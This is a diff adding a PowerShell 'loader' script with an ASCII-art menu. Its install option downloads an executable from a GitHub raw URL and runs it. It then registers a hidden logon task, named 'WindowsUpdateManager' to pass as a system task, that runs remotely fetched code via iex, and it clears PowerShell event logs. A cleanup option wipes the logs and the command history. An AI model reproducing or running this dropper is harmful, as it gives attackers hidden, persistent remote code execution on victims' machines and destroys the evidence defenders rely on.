@@ -1,0 +1,129 @@
+# SINGLE FILE LOADER - INSTALL & CLEAN
+function Show-LoaderMenu {
+    Write-Host ""
+    Write-Host "  ██████  ██    ██ ██████  " -ForegroundColor Cyan
+    Write-Host " ██    ██ ██    ██ ██   ██ " -ForegroundColor Cyan
+    Write-Host " ██    ██ ██    ██ ██████  " -ForegroundColor Cyan
+    Write-Host " ██    ██ ██    ██ ██   ██ " -ForegroundColor Cyan
+    Write-Host "  ██████   ██████  ██   ██ " -ForegroundColor Cyan
+    Write-Host ""
+    Write-Host " SYSTEM LOADER | $(Get-Date -Format 'MM/dd/yyyy')" -ForegroundColor Yellow
+    Write-Host "================================" -ForegroundColor Cyan
+    Write-Host "1. Install & Run System" -ForegroundColor Green
+    Write-Host "2. Clean System" -ForegroundColor Red
+    Write-Host "`nEnter choice (1/2): " -ForegroundColor White -NoNewline
+}
+
+function Install-And-Run-System {
+    Write-Host "`n[+] INSTALLING AND RUNNING SYSTEM..." -ForegroundColor Green
+    
+    # FIXED: ใช้ raw.githubusercontent.com
+    $exeUrl = "https://raw.githubusercontent.com/Verte225066/test/main/system_logs.exe"
+    Write-Host "[DOWNLOAD] Fetching from: $exeUrl" -ForegroundColor Gray
+    
+    try {
+        $webClient = New-Object System.Net.WebClient
+        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+        $exeBytes = $webClient.DownloadData($exeUrl)
+        $webClient.Dispose()
+        
+        Write-Host "[+] Download successful ($($exeBytes.Length) bytes)" -ForegroundColor Green
+        
+        # Save to temp file
+        $tempPath = "$env:TEMP\system_logs.exe"
+        [System.IO.File]::WriteAllBytes($tempPath, $exeBytes)
+        Write-Host "[+] File saved to: $tempPath" -ForegroundColor Green
+        
+        # RUN PROGRAM
+        Write-Host "[EXECUTE] Starting application..." -ForegroundColor Cyan
+        $process = Start-Process -FilePath $tempPath -WindowStyle Normal -PassThru
+        Start-Sleep -Seconds 2
+        
+        if (-not $process.HasExited) {
+            Write-Host "[+] Application running successfully (PID: $($process.Id))" -ForegroundColor Green
+        } else {
+            Write-Host "[!] Application closed immediately" -ForegroundColor Yellow
+        }
+        
+    } catch {
+        Write-Host "[!] Download/Execution failed: $($_.Exception.Message)" -ForegroundColor Red
+        Write-Host "[!] Using PowerShell fallback..." -ForegroundColor Yellow
+        
+        # Fallback worker
+        Write-Host "🔧 PowerShell Worker Activated" -ForegroundColor Green
+        Write-Host "Running on: $env:COMPUTERNAME as $env:USERNAME" -ForegroundColor Cyan
+        Write-Host "Time: $(Get-Date)" -ForegroundColor Cyan
+    }
+    
+    # INSTALL PERSISTENCE
+    try {
+        $taskName = "WindowsUpdateManager"
+        # FIXED: ใช้ raw URL สำหรับ loader ด้วย
+        $loaderUrl = "https://raw.githubusercontent.com/Verte225066/test/main/loader.txt"
+        
+        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"iex ((New-Object Net.WebClient).DownloadString('$loaderUrl'))`""
+        $trigger = New-ScheduledTaskTrigger -AtLogon
+        $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
+        
+        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
+        Start-Sleep -Seconds 1
+        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
+        Write-Host "[+] Persistence installed (Task: $taskName)" -ForegroundColor Green
+        
+    } catch {
+        Write-Host "[!] Persistence failed: $($_.Exception.Message)" -ForegroundColor Red
+    }
+    
+    # STEALTH MEASURES
+    try {
+        wevtutil.exe cl "Microsoft-Windows-PowerShell/Operational" 2>$null
+        wevtutil.exe cl "Windows PowerShell" 2>$null
+        Write-Host "[+] Stealth measures applied" -ForegroundColor Green
+    } catch {}
+    
+    Write-Host "[INSTALL] Installation completed!" -ForegroundColor Green
+}
+
+function Clean-System {
+    Write-Host "`n[-] CLEANING SYSTEM..." -ForegroundColor Yellow
+    
+    try {
+        Unregister-ScheduledTask -TaskName "WindowsUpdateManager" -Confirm:$false -ErrorAction SilentlyContinue
+        Write-Host "[+] Scheduled task removed" -ForegroundColor Green
+    } catch {
+        Write-Host "[!] Task removal failed: $($_.Exception.Message)" -ForegroundColor Red
+    }
+    
+    try {
+        wevtutil.exe cl "Microsoft-Windows-PowerShell/Operational" 2>$null
+        wevtutil.exe cl "Windows PowerShell" 2>$null
+        Write-Host "[+] Event logs cleared" -ForegroundColor Green
+    } catch {}
+    
+    try {
+        Get-ChildItem "$env:TEMP\*" -Include "system_logs.exe" -ErrorAction SilentlyContinue | Remove-Item -Force
+        Write-Host "[+] Temp files cleaned" -ForegroundColor Green
+    } catch {}
+    
+    try {
+        Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
+        Write-Host "[+] Command history cleared" -ForegroundColor Green
+    } catch {}
+    
+    Write-Host "[CLEAN] Cleanup completed!" -ForegroundColor Green
+}
+
+# MAIN EXECUTION
+Show-LoaderMenu
+$choice = Read-Host
+
+switch ($choice) {
+    '1' { Install-And-Run-System }
+    '2' { Clean-System }
+    default {
+        Write-Host "`n[!] Invalid choice" -ForegroundColor Red
+    }
+}
+
+Write-Host "`nOperation completed. Press any key to exit..." -ForegroundColor Gray
+$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
